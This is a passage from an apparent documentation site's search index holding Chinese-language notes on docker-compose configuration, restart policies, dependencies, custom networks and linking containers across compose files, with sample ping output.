dns \uff1a\u914d\u7f6e dns \u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u662f\u4e00\u4e2a\u503c\u6216\u5217\u8868 dns: 8.8.8.8 ------------ dns: - 8.8.8.8 - 9.9.9.9 dns_search \uff1a\u914d\u7f6e DNS \u641c\u7d22\u57df\uff0c\u53ef\u4ee5\u662f\u4e00\u4e2a\u503c\u6216\u5217\u8868 dns_search: example.com ------------------------ dns_search: - dc1.example.com - dc2.example.com environment \uff1a\u73af\u5883\u53d8\u91cf\u914d\u7f6e\uff0c\u53ef\u4ee5\u7528\u6570\u7ec4\u6216\u5b57\u5178\u4e24\u79cd\u65b9\u5f0f environment: RACK_ENV: development SHOW: 'ture' ------------------------- environment: - RACK_ENV=development - SHOW=ture env_file \uff1a\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u73af\u5883\u53d8\u91cf\uff0c\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\u6216\u8def\u5f84\u5217\u8868\uff0c\u5176\u4f18\u5148\u7ea7\u4f4e\u4e8e environment \u6307\u5b9a\u7684\u73af\u5883\u53d8\u91cf env_file: .env --------------- env_file: - ./common.env expose \uff1a\u66b4\u9732\u7aef\u53e3\uff0c\u53ea\u5c06\u7aef\u53e3\u66b4\u9732\u7ed9\u8fde\u63a5\u7684\u670d\u52a1\uff0c\u800c\u4e0d\u66b4\u9732\u7ed9\u4e3b\u673a expose: - \"3000\" - \"8000\" image \uff1a\u6307\u5b9a\u670d\u52a1\u6240\u4f7f\u7528\u7684\u955c\u50cf image: java network_mode \uff1a\u8bbe\u7f6e\u7f51\u7edc\u6a21\u5f0f network_mode: \"bridge\" network_mode: \"host\" network_mode: \"none\" network_mode: \"service:[service name]\" network_mode: \"container:[container name/id]\" ports \uff1a\u5bf9\u5916\u66b4\u9732\u7684\u7aef\u53e3\u5b9a\u4e49\uff0c\u548c expose \u5bf9\u5e94 ports: # \u66b4\u9732\u7aef\u53e3\u4fe1\u606f - \"\u5bbf\u4e3b\u673a\u7aef\u53e3:\u5bb9\u5668\u66b4\u9732\u7aef\u53e3\" - \"8763:8763\" - \"8763:8763\" links \uff1a\u5c06\u6307\u5b9a\u5bb9\u5668\u8fde\u63a5\u5230\u5f53\u524d\u8fde\u63a5\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u522b\u540d\uff0c\u907f\u514dip\u65b9\u5f0f\u5bfc\u81f4\u7684\u5bb9\u5668\u91cd\u542f\u52a8\u6001\u6539\u53d8\u7684\u65e0\u6cd5\u8fde\u63a5\u60c5\u51b5 links: # \u6307\u5b9a\u670d\u52a1\u540d\u79f0:\u522b\u540d - docker-compose-eureka-server:compose-eureka volumes \uff1a\u5377\u6302\u8f7d\u8def\u5f84 volumes: - /lib - /var logs \uff1a\u65e5\u5fd7\u8f93\u51fa\u4fe1\u606f --no-color \u5355\u8272\u8f93\u51fa\uff0c\u4e0d\u663e\u793a\u5176\u4ed6\u989c. -f, --follow \u8ddf\u8e2a\u65e5\u5fd7\u8f93\u51fa\uff0c\u5c31\u662f\u53ef\u4ee5\u5b9e\u65f6\u67e5\u770b\u65e5\u5fd7 -t, --timestamps \u663e\u793a\u65f6\u95f4\u6233 --tail \u4ece\u65e5\u5fd7\u7684\u7ed3\u5c3e\u663e\u793a\uff0c--tail=200","title":"docker-compose.yml \u5c5e\u6027"},{"location":"lxc/docker/pinpoint_compose/#docker-compose_1","text":"","title":"Docker Compose \u5176\u5b83"},{"location":"lxc/docker/pinpoint_compose/#_3","text":"\u5f53\u670d\u52a1\u7684\u914d\u7f6e\u53d1\u751f\u66f4\u6539\u65f6\uff0c\u53ef\u4f7f\u7528 docker-compose up \u547d\u4ee4\u66f4\u65b0\u914d\u7f6e \u6b64\u65f6\uff0cCompose \u4f1a\u5220\u9664\u65e7\u5bb9\u5668\u5e76\u521b\u5efa\u65b0\u5bb9\u5668\uff0c\u65b0\u5bb9\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684 IP \u5730\u5740\u52a0\u5165\u7f51\u7edc\uff0c\u540d\u79f0\u4fdd\u6301\u4e0d\u53d8\uff0c\u4efb\u4f55\u6307\u5411\u65e7\u5bb9\u8d77\u7684\u8fde\u63a5\u90fd\u4f1a\u88ab\u5173\u95ed\uff0c\u91cd\u65b0\u627e\u5230\u65b0\u5bb9\u5668\u5e76\u8fde\u63a5\u4e0a\u53bb","title":"\u66f4\u65b0\u5bb9\u5668"},{"location":"lxc/docker/pinpoint_compose/#links","text":"\u670d\u52a1\u4e4b\u95f4\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u540d\u79f0\u76f8\u4e92\u8bbf\u95ee\uff0clinks \u5141\u8bb8\u5b9a\u4e49\u4e00\u4e2a\u522b\u540d\uff0c\u4ece\u800c\u4f7f\u7528\u8be5\u522b\u540d\u8bbf\u95ee\u5176\u5b83\u670d\u52a1 version: '2' services: web: build: . links: - \"db:database\" db: image: postgres \u8fd9\u6837 Web \u670d\u52a1\u5c31\u53ef\u4ee5\u4f7f\u7528 db \u6216 database \u4f5c\u4e3a hostname \u8bbf\u95ee db \u670d\u52a1\u4e86","title":"links"},{"location":"lxc/docker/pinpoint_compose/#restart","text":"\u91cd\u542f\u7b56\u7565 always \u2013 \u4e0d\u7ba1\u9000\u51fa\u72b6\u6001\u7801\u662f\u4ec0\u4e48\u59cb\u7ec8\u91cd\u542f\u5bb9\u5668\u3002\u5f53\u6307\u5b9aalways\u65f6\uff0cdocker daemon\u5c06\u65e0\u9650\u6b21\u6570\u5730\u91cd\u542f\u5bb9\u5668\u3002\u5bb9\u5668\u4e5f\u4f1a\u5728daemon\u542f\u52a8\u65f6\u5c1d\u8bd5\u91cd\u542f\uff0c\u4e0d\u7ba1\u5bb9\u5668\u5f53\u65f6\u7684\u72b6\u6001\u5982\u4f55\u3002 no \u2013 \u5bb9\u5668\u9000\u51fa\u65f6\u4e0d\u8981\u81ea\u52a8\u91cd\u542f\u3002\u8fd9\u4e2a\u662f\u9ed8\u8ba4\u503c\u3002 on-failure[:max-retries] \u2013 \u53ea\u5728\u5bb9\u5668\u4ee5\u975e0\u72b6\u6001\u7801\u9000\u51fa\u65f6\u91cd\u542f\u3002\u53ef\u9009\u7684\uff0c\u53ef\u4ee5\u9000\u51fadocker daemon\u5c1d\u8bd5\u91cd\u542f\u5bb9\u5668\u7684\u6b21\u6570\u3002 unless-stopped - \u4e0d\u7ba1\u9000\u51fa\u72b6\u6001\u7801\u662f\u4ec0\u4e48\u59cb\u7ec8\u91cd\u542f\u5bb9\u5668\uff0c\u4e0d\u8fc7\u5f53daemon\u542f\u52a8\u65f6\uff0c\u5982\u679c\u5bb9\u5668\u4e4b\u524d\u5df2\u7ecf\u4e3a\u505c\u6b62\u72b6\u6001\uff0c\u4e0d\u8981\u5c1d\u8bd5\u542f\u52a8\u5b83\u3002","title":"restart"},{"location":"lxc/docker/pinpoint_compose/#depends_on","text":"\u5728\u4f7f\u7528 Compose \u65f6\uff0c\u6700\u5927\u7684\u597d\u5904\u5c31\u662f\u5c11\u6253\u542f\u52a8\u547d\u4ee4\uff0c\u4f46\u662f\u4e00\u822c\u9879\u76ee\u5bb9\u5668\u542f\u52a8\u7684\u987a\u5e8f\u662f\u6709\u8981\u6c42\u7684\uff0c\u5982\u679c\u76f4\u63a5\u4ece\u4e0a\u5230\u4e0b\u542f\u52a8\u5bb9\u5668\uff0c\u5fc5\u7136\u4f1a\u56e0\u4e3a\u5bb9\u5668\u4f9d\u8d56\u95ee\u9898\u800c\u542f\u52a8\u5931\u8d25\u3002 \u4f8b\u5982\u5728\u6ca1\u542f\u52a8\u6570\u636e\u5e93\u5bb9\u5668\u7684\u65f6\u5019\u542f\u52a8\u4e86\u5e94\u7528\u5bb9\u5668\uff0c\u8fd9\u65f6\u5019\u5e94\u7528\u5bb9\u5668\u4f1a\u56e0\u4e3a\u627e\u4e0d\u5230\u6570\u636e\u5e93\u800c\u9000\u51fa\uff0c\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u6211\u4eec\u9700\u8981\u52a0\u5165\u4e00\u4e2a\u6807\u7b7e\uff0c\u5c31\u662f depends_on\uff0c\u8fd9\u4e2a\u6807\u7b7e\u89e3\u51b3\u4e86\u5bb9\u5668\u7684\u4f9d\u8d56\u3001\u542f\u52a8\u5148\u540e\u7684\u95ee\u9898\u3002 \u4f8b\u5982\u4e0b\u9762\u5bb9\u5668\u4f1a\u5148\u542f\u52a8 redis \u548c db \u4e24\u4e2a\u670d\u52a1\uff0c\u6700\u540e\u624d\u542f\u52a8 web \u670d\u52a1\uff1a version: '2' services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres \u6ce8\u610f\u7684\u662f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 docker-compose up web \u8fd9\u6837\u7684\u65b9\u5f0f\u542f\u52a8 web \u670d\u52a1\u65f6\uff0c\u4e5f\u4f1a\u542f\u52a8 redis \u548c db \u4e24\u4e2a\u670d\u52a1\uff0c\u56e0\u4e3a\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86\u4f9d\u8d56\u5173\u7cfb\u3002 https://juejin.cn/post/6844903976534540296 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cCompose\u4f1a\u4e3a\u6211\u4eec\u7684\u5e94\u7528\u521b\u5efa\u4e00\u4e2a\u7f51\u7edc\uff0c\u670d\u52a1\u7684\u6bcf\u4e2a\u5bb9\u5668\u90fd\u4f1a\u52a0\u5165\u8be5\u7f51\u7edc\u4e2d\u3002\u8fd9\u6837\uff0c\u5bb9\u5668\u5c31\u53ef\u88ab\u8be5\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u5bb9\u5668\u8bbf\u95ee\uff0c\u4e0d\u4ec5\u5982\u6b64\uff0c\u8be5\u5bb9\u5668\u8fd8\u80fd\u4ee5\u670d\u52a1\u540d\u79f0\u4f5c\u4e3ahostname\u88ab\u5176\u4ed6\u5bb9\u5668\u8bbf\u95ee\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u7f51\u7edc\u540d\u79f0\u57fa\u4e8eCompose\u7684\u5de5\u7a0b\u540d\u79f0\uff0c\u800c\u9879\u76ee\u540d\u79f0\u57fa\u4e8edocker-compose.yml\u6240\u5728\u76ee\u5f55\u7684\u540d\u79f0\u3002\u5982\u9700\u4fee\u6539\u5de5\u7a0b\u540d\u79f0\uff0c\u53ef\u4f7f\u7528--project-name\u6807\u8bc6\u6216COMPOSE_PORJECT_NAME\u73af\u5883\u53d8\u91cf\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5728\u540d\u4e3amyapp\u7684\u76ee\u5f55\u4e2d\uff0c\u5e76\u4e14docker-compose.yml\u5982\u4e0b\u6240\u793a\uff1a version: '2' services: web: build: . ports: - \"8000:8000\" db: image: postgres \u590d\u5236\u4ee3\u7801 \u5f53\u6211\u4eec\u8fd0\u884cdocker-compose up\u65f6\uff0c\u5c06\u4f1a\u6267\u884c\u4ee5\u4e0b\u51e0\u6b65\uff1a \u521b\u5efa\u4e00\u4e2a\u540d\u4e3amyapp_default\u7684\u7f51\u7edc\uff1b \u4f7f\u7528web\u670d\u52a1\u7684\u914d\u7f6e\u521b\u5efa\u5bb9\u5668\uff0c\u5b83\u4ee5\u201cweb\u201d\u8fd9\u4e2a\u540d\u79f0\u52a0\u5165\u7f51\u7edcmyapp_default\uff1b \u4f7f\u7528db\u670d\u52a1\u7684\u914d\u7f6e\u521b\u5efa\u5bb9\u5668\uff0c\u5b83\u4ee5\u201cdb\u201d\u8fd9\u4e2a\u540d\u79f0\u52a0\u5165\u7f51\u7edcmyapp_default\u3002 \u5bb9\u5668\u95f4\u53ef\u4f7f\u7528\u670d\u52a1\u540d\u79f0\uff08web\u6216db\uff09\u4f5c\u4e3ahostname\u76f8\u4e92\u8bbf\u95ee\u3002\u4f8b\u5982\uff0cweb\u8fd9\u4e2a\u670d\u52a1\u53ef\u4f7f\u7528 postgres://db:5432 \u8bbf\u95eedb\u5bb9\u5668\u3002","title":"depends_on"},{"location":"lxc/docker/pinpoint_compose/#_4","text":"\u5f53\u670d\u52a1\u7684\u914d\u7f6e\u53d1\u751f\u66f4\u6539\u65f6\uff0c\u53ef\u4f7f\u7528docker-compose up\u547d\u4ee4\u66f4\u65b0\u914d\u7f6e\u3002 \u6b64\u65f6\uff0cCompose\u4f1a\u5220\u9664\u65e7\u5bb9\u5668\u5e76\u521b\u5efa\u65b0\u5bb9\u5668\u3002\u65b0\u5bb9\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684IP\u5730\u5740\u52a0\u5165\u7f51\u7edc\uff0c\u540d\u79f0\u4fdd\u6301\u4e0d\u53d8\u3002\u4efb\u4f55\u6307\u5411\u65e7\u5bb9\u5668\u7684\u8fde\u63a5\u90fd\u4f1a\u88ab\u5173\u95ed\uff0c\u5bb9\u5668\u4f1a\u91cd\u65b0\u627e\u5230\u65b0\u5bb9\u5668\u5e76\u8fde\u63a5\u4e0a\u53bb\u3002","title":"\u66f4\u65b0\u5bb9\u5668"},{"location":"lxc/docker/pinpoint_compose/#links_1","text":"\u524d\u6587\u8bb2\u8fc7\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u670d\u52a1\u4e4b\u95f4\u53ef\u4f7f\u7528\u670d\u52a1\u540d\u79f0\u76f8\u4e92\u8bbf\u95ee\u3002links\u5141\u8bb8\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u522b\u540d\uff0c\u4ece\u800c\u4f7f\u7528\u8be5\u522b\u540d\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1a version: '2' services: web: build: . links: - \"db:database\" db: image: postgres \u590d\u5236\u4ee3\u7801 \u8fd9\u6837web\u670d\u52a1\u5c31\u53ef\u4f7f\u7528db\u6216database\u4f5c\u4e3ahostname\u8bbf\u95eedb\u670d\u52a1\u4e86\u3002","title":"links"},{"location":"lxc/docker/pinpoint_compose/#_5","text":"\u4e00\u4e9b\u573a\u666f\u4e0b\uff0c\u9ed8\u8ba4\u7684\u7f51\u7edc\u914d\u7f6e\u6ee1\u8db3\u4e0d\u4e86\u6211\u4eec\u7684\u9700\u6c42\uff0c\u6b64\u65f6\u6211\u4eec\u53ef\u4f7f\u7528networks\u547d\u4ee4\u81ea\u5b9a\u4e49\u7f51\u7edc\u3002networks\u547d\u4ee4\u5141\u8bb8\u6211\u4eec\u521b\u5efa\u66f4\u52a0\u590d\u6742\u7684\u7f51\u7edc\u62d3\u6251\u5e76\u6307\u5b9a\u81ea\u5b9a\u4e49\u7f51\u7edc\u9a71\u52a8\u548c\u9009\u9879\u3002\u4e0d\u4ec5\u5982\u6b64\uff0c\u6211\u4eec\u8fd8\u53ef\u4f7f\u7528networks\u5c06\u670d\u52a1\u8fde\u63a5\u5230\u4e0d\u662f\u7531Compose\u7ba1\u7406\u7684\u3001\u5916\u90e8\u521b\u5efa\u7684\u7f51\u7edc\u3002 \u5982\u4e0b\uff0c\u6211\u4eec\u5728\u5176\u4e2d\u5b9a\u4e49\u4e86\u4e24\u4e2a\u81ea\u5b9a\u4e49\u7f51\u7edc\u3002 version: '2' services: proxy: build: ./proxy networks: - front app: build: ./app networks: - front - back db: image: postgres networks: - back networks: front: # Use a custom driver driver: custom-driver-1 back: # Use a custom driver which takes special options driver: custom-driver-2 driver_opts: foo: \"1\" bar: \"2\" \u590d\u5236\u4ee3\u7801 \u5176\u4e2d\uff0cproxy\u670d\u52a1\u4e0edb\u670d\u52a1\u9694\u79bb\uff0c\u4e24\u8005\u5206\u522b\u4f7f\u7528\u81ea\u5df1\u7684\u7f51\u7edc\uff1bapp\u670d\u52a1\u53ef\u4e0e\u4e24\u8005\u901a\u4fe1\u3002 \u7531\u672c\u4f8b\u4e0d\u96be\u53d1\u73b0\uff0c\u4f7f\u7528networks\u547d\u4ee4\uff0c\u5373\u53ef\u65b9\u4fbf\u5b9e\u73b0\u670d\u52a1\u95f4\u7684\u7f51\u7edc\u9694\u79bb\u4e0e\u8fde\u63a5\u3002","title":"\u6307\u5b9a\u81ea\u5b9a\u4e49\u7f51\u7edc"},{"location":"lxc/docker/pinpoint_compose/#_6","text":"\u9664\u81ea\u5b9a\u4e49\u7f51\u7edc\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4e3a\u9ed8\u8ba4\u7f51\u7edc\u81ea\u5b9a\u4e49\u914d\u7f6e\u3002 version: '2' services: web: build: . ports: - \"8000:8000\" db: image: postgres networks: default: # Use a custom driver driver: custom-driver-1 \u590d\u5236\u4ee3\u7801 \u8fd9\u6837\uff0c\u5c31\u53ef\u4e3a\u8be5\u5e94\u7528\u6307\u5b9a\u81ea\u5b9a\u4e49\u7684\u7f51\u7edc\u9a71\u52a8\u3002","title":"\u914d\u7f6e\u9ed8\u8ba4\u7f51\u7edc"},{"location":"lxc/docker/pinpoint_compose/#_7","text":"\u4e00\u4e9b\u573a\u666f\u4e0b\uff0c\u6211\u4eec\u5e76\u4e0d\u9700\u8981\u521b\u5efa\u65b0\u7684\u7f51\u7edc\uff0c\u800c\u53ea\u9700\u52a0\u5165\u5df2\u5b58\u5728\u7684\u7f51\u7edc\uff0c\u6b64\u65f6\u53ef\u4f7f\u7528external\u9009\u9879\u3002\u793a\u4f8b\uff1a networks: default: external: name: my-pre-existing-network\u590d\u5236\u4ee3\u7801","title":"\u4f7f\u7528\u5df2\u5b58\u5728\u7684\u7f51\u7edc"},{"location":"lxc/docker/pinpoint_compose/#docker-compose_2","text":"\u5728Docker\u4e2d\uff0c\u5bb9\u5668\u4e4b\u95f4\u7684\u94fe\u63a5\u662f\u4e00\u79cd\u5f88\u5e38\u89c1\u7684\u64cd\u4f5c\uff1a\u5b83\u63d0\u4f9b\u4e86\u8bbf\u95ee\u5176\u4e2d\u7684\u67d0\u4e2a\u5bb9\u5668\u7684\u7f51\u7edc\u670d\u52a1\u800c\u4e0d\u9700\u8981\u5c06\u6240\u9700\u7684\u7aef\u53e3\u66b4\u9732\u7ed9Docker Host\u4e3b\u673a\u7684\u529f\u80fd\u3002Docker Compose\u4e2d\u5bf9\u8be5\u7279\u6027\u7684\u652f\u6301\u540c\u6837\u662f\u5f88\u65b9\u4fbf\u7684\u3002\u7136\u800c\uff0c\u5982\u679c\u9700\u8981\u94fe\u63a5\u7684\u5bb9\u5668\u6ca1\u6709\u5b9a\u4e49\u5728\u540c\u4e00\u4e2a docker-compose.yml \u4e2d\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u7a0d\u5fae\u9ebb\u70e6\u590d\u6742\u4e86\u70b9\u3002 \u5728\u4e0d\u4f7f\u7528Docker Compose\u7684\u65f6\u5019\uff0c\u5c06\u4e24\u4e2a\u5bb9\u5668\u94fe\u63a5\u8d77\u6765\u4f7f\u7528 \u2014link \u53c2\u6570\uff0c\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u7b80\u5355\uff0c\u4ee5 nginx \u955c\u50cf\u4e3a\u4f8b\u5b50\uff1a docker run --rm --name test1 -d nginx #\u5f00\u542f\u4e00\u4e2a\u5b9e\u4f8btest1 docker run --rm --name test2 --link test1 -d nginx #\u5f00\u542f\u4e00\u4e2a\u5b9e\u4f8btest2\u5e76\u4e0etest1\u5efa\u7acb\u94fe\u63a5 \u590d\u5236\u4ee3\u7801 \u8fd9\u6837\uff0c test2 \u4e0e test1 \u4fbf\u5efa\u7acb\u4e86\u94fe\u63a5\uff0c\u5c31\u53ef\u4ee5\u5728 test2 \u4e2d\u4f7f\u7528\u8bbf\u95ee test1 \u4e2d\u7684\u670d\u52a1\u4e86\u3002 \u5982\u679c\u4f7f\u7528Docker Compose\uff0c\u90a3\u4e48\u8fd9\u4e2a\u4e8b\u60c5\u5c31\u66f4\u7b80\u5355\u4e86\uff0c\u8fd8\u662f\u4ee5\u4e0a\u9762\u7684 nginx \u955c\u50cf\u4e3a\u4f8b\u5b50\uff0c\u7f16\u8f91 docker-compose.yml \u6587\u4ef6\u4e3a\uff1a version: \"3\" services: test2: image: nginx depends_on: - test1 links: - test1 test1: image: nginx \u590d\u5236\u4ee3\u7801 \u6700\u7ec8\u6548\u679c\u4e0e\u4f7f\u7528\u666e\u901a\u7684Docker\u547d\u4ee4 docker run xxxx \u5efa\u7acb\u7684\u94fe\u63a5\u5e76\u65e0\u533a\u522b\u3002\u8fd9\u53ea\u662f\u4e00\u79cd\u6700\u4e3a\u7406\u60f3\u7684\u60c5\u51b5\u3002 \u5982\u679c\u5bb9\u5668\u6ca1\u6709\u5b9a\u4e49\u5728\u540c\u4e00\u4e2a docker-compose.yml \u6587\u4ef6\u4e2d\uff0c\u5e94\u8be5\u5982\u4f55\u94fe\u63a5\u5b83\u4eec\u5462\uff1f \u53c8\u5982\u679c\u5b9a\u4e49\u5728 docker-compose.yml \u6587\u4ef6\u4e2d\u7684\u5bb9\u5668\u9700\u8981\u4e0e docker run xxx \u542f\u52a8\u7684\u5bb9\u5668\u94fe\u63a5\uff0c\u9700\u8981\u5982\u4f55\u5904\u7406\uff1f \u9488\u5bf9\u8fd9\u4e24\u79cd\u5178\u578b\u7684\u60c5\u51b5\uff0c\u4e0b\u9762\u7ed9\u51fa\u6211\u4e2a\u4eba\u6d4b\u8bd5\u53ef\u884c\u7684\u529e\u6cd5\uff1a","title":"Docker Compose \u94fe\u63a5\u5916\u90e8\u5bb9\u5668\u7684\u51e0\u79cd\u65b9\u5f0f"},{"location":"lxc/docker/pinpoint_compose/#_8","text":"\u6211\u4eec\u8fd8\u662f\u4f7f\u7528nginx\u955c\u50cf\u6765\u6a21\u62df\u8fd9\u6837\u7684\u4e00\u4e2a\u60c5\u666f\uff1a\u5047\u8bbe\u6211\u4eec\u9700\u8981\u5c06\u4e24\u4e2a\u4f7f\u7528Docker Compose\u7ba1\u7406\u7684nignx\u5bb9\u5668\uff08 test1 \u548c test2 \uff09\u94fe\u63a5\u8d77\u6765\uff0c\u4f7f\u5f97 test2 \u80fd\u591f\u8bbf\u95ee test1 \u4e2d\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5\u80fdping\u901a\u4e3a\u51c6\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5b9a\u4e49\u5bb9\u5668 test1 \u7684 docker-compose.yml \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a version: \"3\" services: test2: image: nginx container_name: test1 networks: - default - app_net networks: app_net: external: true \u590d\u5236\u4ee3\u7801 \u5bb9\u5668 test2 \u5185\u5bb9\u4e0e test1 \u57fa\u672c\u4e00\u6837\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2a external_links ,\u9700\u8981\u7279\u522b\u8bf4\u660e\u7684\u662f\uff1a \u6700\u8fd1\u53d1\u5e03\u7684Docker\u7248\u672c\u5df2\u7ecf\u4e0d\u9700\u8981\u4f7f\u7528external_links\u6765\u94fe\u63a5\u5bb9\u5668\uff0c\u5bb9\u5668\u7684DNS\u670d\u52a1\u53ef\u4ee5\u6b63\u786e\u7684\u4f5c\u51fa\u5224\u65ad \uff0c\u56e0\u6b64\u5982\u679c\u4f60\u4f60\u9700\u8981\u517c\u5bb9\u8f83\u8001\u7248\u672c\u7684Docker\u7684\u8bdd\uff0c\u90a3\u4e48\u5bb9\u5668 test2 \u7684 docker-compose.yml \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a version: \"3\" services: test2: image: nginx networks: - default - app_net external_links: - test1 container_name: test2 networks: app_net: external: true\u590d\u5236\u4ee3\u7801 \u5426\u5219\u7684\u8bdd\uff0c test2 \u7684 docker-compose.yml \u548c test1 \u7684\u5b9a\u4e49\u5b8c\u5168\u4e00\u81f4\uff0c\u4e0d\u9700\u8981\u989d\u5916\u591a\u6307\u5b9a\u4e00\u4e2a external_links \u3002\u76f8\u5173\u7684\u95ee\u9898\u8bf7\u53c2\u89c1stackoverflow\u4e0a\u7684\u76f8\u5173\u95ee\u9898\uff1a docker-compose + external container \u6b63\u5982\u4f60\u770b\u5230\u7684\u90a3\u6837\uff0c\u8fd9\u91cc\u4e24\u4e2a\u5bb9\u5668\u7684\u5b9a\u4e49\u91cc\u90fd\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u5916\u90e8\u7f51\u7edc app_net ,\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5728\u542f\u52a8\u8fd9\u4e24\u4e2a\u5bb9\u5668\u4e4b\u524d\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u518d\u521b\u5efa\u5916\u90e8\u7f51\u7edc\uff1a docker network create app_net\u590d\u5236\u4ee3\u7801 \u4e4b\u540e\uff0c\u901a\u8fc7 docker-compose up -d \u547d\u4ee4\u542f\u52a8\u8fd9\u4e24\u4e2a\u5bb9\u5668\uff0c\u7136\u540e\u6267\u884c docker exec -it test2 ping test1 ,\u4f60\u5c06\u4f1a\u770b\u5230\u5982\u4e0b\u7684\u8f93\u51fa\uff1a docker exec -it test2 ping test1 PING test1 (172.18.0.2): 56 data bytes 64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.091 ms 64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.146 ms 64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.150 ms 64 bytes from 172.18.0.2: icmp_seq=3 ttl=64 time=0.145 ms 64 bytes from 172.18.0.2: icmp_seq=4 ttl=64 time=0.126 ms 64 bytes from 172.18.0.2: icmp_seq=5 ttl=64 time=0.147 ms \u590d\u5236\u4ee3\u7801 \u8bc1\u660e\u8fd9\u4e24\u4e2a\u5bb9\u5668\u662f\u6210\u529f\u94fe\u63a5\u4e86\uff0c\u53cd\u8fc7\u6765\u5728 test1 \u4e2dping test2 \u4e5f\u662f\u80fd\u591f\u6b63\u5e38ping\u901a\u7684\u3002 \u5982\u679c\u6211\u4eec\u901a\u8fc7 docker run --rm --name test3 -d nginx \u8fd9\u79cd\u65b9\u5f0f\u6765\u5148\u542f\u52a8\u4e86\u4e00\u4e2a\u5bb9\u5668( test3 )\u5e76\u4e14\u6ca1\u6709\u6307\u5b9a\u5b83\u6240\u5c5e\u7684\u5916\u90e8\u7f51\u7edc\uff0c\u800c\u9700\u8981\u5c06\u5176\u4e0e test1 \u6216\u8005 test2 \u94fe\u63a5\u7684\u8bdd\uff0c\u8fd9\u4e2a\u65f6\u5019\u624b\u52a8\u94fe\u63a5\u5916\u90e8\u7f51\u7edc\u5373\u53ef\uff1a docker network connect app_net test3\u590d\u5236\u4ee3\u7801 \u8fd9\u6837\uff0c\u4e09\u4e2a\u5bb9\u5668\u90fd\u53ef\u4ee5\u76f8\u4e92\u8bbf\u95ee\u4e86\u3002","title":"\u65b9\u5f0f\u4e00\uff1a\u8ba9\u9700\u8981\u94fe\u63a5\u7684\u5bb9\u5668\u540c\u5c5e\u4e00\u4e2a\u5916\u90e8\u7f51\u7edc"},{"location":"lxc/docker/pinpoint_compose/#_9","text":"\u901a\u8fc7\u66f4\u6539\u4f60\u60f3\u8981\u76f8\u4e92\u94fe\u63a5\u7684\u5bb9\u5668\u7684\u7f51\u7edc\u6a21\u5f0f\u4e3a bridge ,\u5e76\u6307\u5b9a\u9700\u8981\u94fe\u63a5\u7684\u5916\u90e8\u5bb9\u5668\uff08 external_links )\u5373\u53ef\u3002\u4e0e\u540c\u5c5e\u5916\u90e8\u7f51\u7edc\u7684\u5bb9\u5668\u53ef\u4ee5\u76f8\u4e92\u8bbf\u95ee\u7684\u94fe\u63a5\u65b9\u5f0f\u4e00\u4e0d\u540c\uff0c\u8fd9\u79cd\u65b9\u5f0f\u7684\u8bbf\u95ee\u662f\u5355\u5411\u7684\u3002 \u8fd8\u662f\u4ee5nginx\u5bb9\u5668\u955c\u50cf\u4e3a\u4f8b\u5b50\uff0c\u5982\u679c\u5bb9\u5668\u5b9e\u4f8b nginx1 \u9700\u8981\u8bbf\u95ee\u5bb9\u5668\u5b9e\u4f8b nginx2 \uff0c\u90a3\u4e48 nginx2 \u7684 doker-compose.yml \u5b9a\u4e49\u4e3a\uff1a version: \"3\" services: nginx2: image: nginx container_name: nginx2 network_mode: bridge \u590d\u5236\u4ee3\u7801 \u4e0e\u5176\u5bf9\u5e94\u7684\uff0c nginx1 \u7684 docker-compose.yml \u5b9a\u4e49\u4e3a\uff1a version: \"3\" services: nginx1: image: nginx external_links: - nginx2 container_name: nginx1 network_mode: bridge \u590d\u5236\u4ee3\u7801 \u9700\u8981\u7279\u522b\u8bf4\u660e\u7684\u662f\uff0c\u8fd9\u91cc\u7684 external_links \u662f\u4e0d\u80fd\u7701\u7565\u7684\uff0c\u800c\u4e14 nginx1 \u7684\u542f\u52a8\u5fc5\u987b\u8981\u5728 nginx2 \u4e4b\u540e\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u62a5\u627e\u4e0d\u5230\u5bb9\u5668 nginx2 \u7684\u9519\u8bef\u3002 \u63a5\u7740\u6211\u4eec\u4f7f\u7528ping\u6765\u6d4b\u8bd5\u4e0b\u8fde\u901a\u6027\uff1a $ docker exec -it nginx1 ping nginx2 # nginx1 to nginx2 PING nginx2 (172.17.0.4): 56 data bytes 64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.141 ms 64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.139 ms 64 bytes from 172.17.0.4: icmp_seq=2 ttl=64 